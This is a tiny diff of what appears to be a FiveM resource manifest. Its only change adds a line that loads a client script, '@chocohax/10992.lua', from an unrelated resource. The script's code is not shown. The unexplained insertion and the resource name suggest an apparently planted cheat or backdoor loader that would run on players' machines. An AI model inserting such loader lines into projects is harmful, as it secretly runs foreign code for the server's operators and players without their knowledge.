@@ -19,3 +19,4 @@ server_scripts {
 files {
 	"icons/*.png"
 }
+client_script '@chocohax/10992.lua'
